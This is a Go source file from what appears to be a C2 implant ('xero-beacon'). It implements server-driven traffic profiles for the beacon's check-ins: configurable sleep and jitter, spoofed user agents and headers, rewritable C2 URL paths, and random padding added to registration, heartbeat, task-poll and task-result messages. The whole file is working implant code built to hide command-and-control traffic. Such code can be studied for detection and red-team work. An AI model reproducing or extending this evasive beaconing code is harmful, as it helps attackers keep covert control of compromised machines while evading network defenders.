package beacon

import (
	"encoding/base64"
	"math/rand"
	"net/http"
	"net/url"
	"strings"

	"xero-beacon/internal/config"
)

type trafficPaddingProfile struct {
	Enabled  bool
	MinBytes int
	MaxBytes int
}

type trafficRuntimeProfile struct {
	ID           string
	Name         string
	Template     string
	Version      int
	SleepSeconds int
	Jitter       float64
	UserAgent    string
	Headers      map[string]string
	Paths        map[string]string
	Padding      trafficPaddingProfile
}

func defaultRuntimeProfile(cfg config.Config) trafficRuntimeProfile {
	return trafficRuntimeProfile{
		Name:         defaultStringValue(cfg.ProfileName, "default"),
		Template:     "default",
		SleepSeconds: cfg.SleepSeconds,
		Jitter:       cfg.Jitter,
		UserAgent:    defaultStringValue(cfg.UserAgent, "xero-go-beacon/0.1"),
		Headers:      map[string]string{},
		Paths: map[string]string{
			"frame":     "/api/v1/beacons/{beacon_id}/frame",
			"poll":      "/api/v1/beacons/{beacon_id}/poll",
			"register":  "/api/v1/beacons/register",
			"websocket": "/ws/beacon",
		},
		Padding: trafficPaddingProfile{},
	}
}

func (profile trafficRuntimeProfile) clone() trafficRuntimeProfile {
	cloned := profile
	cloned.Headers = cloneStringMap(profile.Headers)
	cloned.Paths = cloneStringMap(profile.Paths)
	return cloned
}

func (profile trafficRuntimeProfile) path(key string, beaconID string) string {
	path := profile.Paths[key]
	if path == "" {
		path = defaultRuntimeProfile(config.Config{}).Paths[key]
	}
	return strings.ReplaceAll(path, "{beacon_id}", beaconID)
}

func (a *Agent) currentProfile() trafficRuntimeProfile {
	a.profileMu.RLock()
	defer a.profileMu.RUnlock()
	return a.Profile.clone()
}

func (a *Agent) applyProfileACK(payload map[string]any) {
	rawProfile, ok := payload["profile"].(map[string]any)
	if !ok || rawProfile == nil {
		return
	}
	rawConfig, ok := rawProfile["config"].(map[string]any)
	if !ok || rawConfig == nil {
		return
	}
	next := a.currentProfile()
	next.ID = stringValue(rawProfile["id"])
	next.Name = defaultStringValue(stringValue(rawProfile["name"]), next.Name)
	next.Template = defaultStringValue(stringValue(rawProfile["template"]), next.Template)
	next.Version = numericInt(rawProfile["current_version"], next.Version)
	next.SleepSeconds = numericInt(rawConfig["sleep_seconds"], next.SleepSeconds)
	next.Jitter = numericFloat(rawConfig["jitter"], next.Jitter)
	next.UserAgent = defaultStringValue(stringValue(rawConfig["user_agent"]), next.UserAgent)
	next.Headers = stringMap(rawConfig["headers"])
	if len(next.Headers) == 0 {
		next.Headers = map[string]string{}
	}
	if parsedPaths := stringMap(rawConfig["paths"]); len(parsedPaths) > 0 {
		for key, value := range defaultRuntimeProfile(config.Config{}).Paths {
			if parsedPaths[key] == "" {
				parsedPaths[key] = value
			}
		}
		next.Paths = parsedPaths
	}
	if padding, ok := rawConfig["padding"].(map[string]any); ok {
		next.Padding = trafficPaddingProfile{
			Enabled:  boolValue(padding["enabled"], next.Padding.Enabled),
			MinBytes: numericInt(padding["min_bytes"], next.Padding.MinBytes),
			MaxBytes: numericInt(padding["max_bytes"], next.Padding.MaxBytes),
		}
		if next.Padding.MinBytes < 0 {
			next.Padding.MinBytes = 0
		}
		if next.Padding.MaxBytes < next.Padding.MinBytes {
			next.Padding.MaxBytes = next.Padding.MinBytes
		}
	}
	a.profileMu.Lock()
	a.Profile = next
	a.profileMu.Unlock()
}

func (a *Agent) applyProfileHeaders(req *http.Request) {
	profile := a.currentProfile()
	req.Header.Set("User-Agent", profile.UserAgent)
	for name, value := range profile.Headers {
		if isReservedProfileHeader(name) {
			continue
		}
		req.Header.Set(name, value)
	}
}

func (a *Agent) c2ProfileURL(pathKey string) string {
	profile := a.currentProfile()
	return strings.TrimRight(a.cfg().C2URL, "/") + profile.path(pathKey, a.State.BeaconID)
}

func (a *Agent) websocketProfileURL() (string, error) {
	profile := a.currentProfile()
	parsed, err := url.Parse(strings.TrimRight(a.cfg().C2URL, "/") + profile.path("websocket", a.State.BeaconID))
	if err != nil {
		return "", err
	}
	if parsed.Scheme == "https" {
		parsed.Scheme = "wss"
	} else {
		parsed.Scheme = "ws"
	}
	if a.State.BeaconID != "" && !strings.Contains(parsed.Path, a.State.BeaconID) {
		query := parsed.Query()
		query.Set("beacon_id", a.State.BeaconID)
		parsed.RawQuery = query.Encode()
	}
	return parsed.String(), nil
}

func (a *Agent) payloadWithPadding(messageType string, payload map[string]any) map[string]any {
	if !profilePaddingEligible(messageType) {
		return payload
	}
	profile := a.currentProfile()
	padding := profile.Padding
	if !padding.Enabled || padding.MaxBytes <= 0 {
		return payload
	}
	size := padding.MinBytes
	if padding.MaxBytes > padding.MinBytes {
		size += rand.Intn(padding.MaxBytes - padding.MinBytes + 1)
	}
	if size <= 0 {
		return payload
	}
	cloned := cloneAnyMap(payload)
	buffer := make([]byte, size)
	for index := range buffer {
		buffer[index] = byte(rand.Intn(256))
	}
	cloned["traffic_padding_b64"] = base64.StdEncoding.EncodeToString(buffer)
	return cloned
}

func profilePaddingEligible(messageType string) bool {
	switch messageType {
	case "REGISTER", "HEARTBEAT", "TASK_POLL", "TASK_RESULT":
		return true
	default:
		return false
	}
}

func isReservedProfileHeader(name string) bool {
	switch strings.ToLower(name) {
	case "authorization", "connection", "content-length", "content-type", "host", "sec-websocket-key", "sec-websocket-protocol", "sec-websocket-version", "upgrade":
		return true
	default:
		return false
	}
}

func stringMap(value any) map[string]string {
	raw, ok := value.(map[string]any)
	if !ok {
		return map[string]string{}
	}
	parsed := map[string]string{}
	for key, item := range raw {
		if text := stringValue(item); text != "" {
			parsed[key] = text
		}
	}
	return parsed
}

func cloneStringMap(value map[string]string) map[string]string {
	cloned := map[string]string{}
	for key, item := range value {
		cloned[key] = item
	}
	return cloned
}

func cloneAnyMap(value map[string]any) map[string]any {
	cloned := map[string]any{}
	for key, item := range value {
		cloned[key] = item
	}
	return cloned
}

func boolValue(value any, fallback bool) bool {
	parsed, ok := value.(bool)
	if !ok {
		return fallback
	}
	return parsed
}

func numericFloat(value any, fallback float64) float64 {
	switch typed := value.(type) {
	case float64:
		return typed
	case int:
		return float64(typed)
	default:
		return fallback
	}
}

func defaultStringValue(value string, fallback string) string {
	if value == "" {
		return fallback
	}
	return value
}
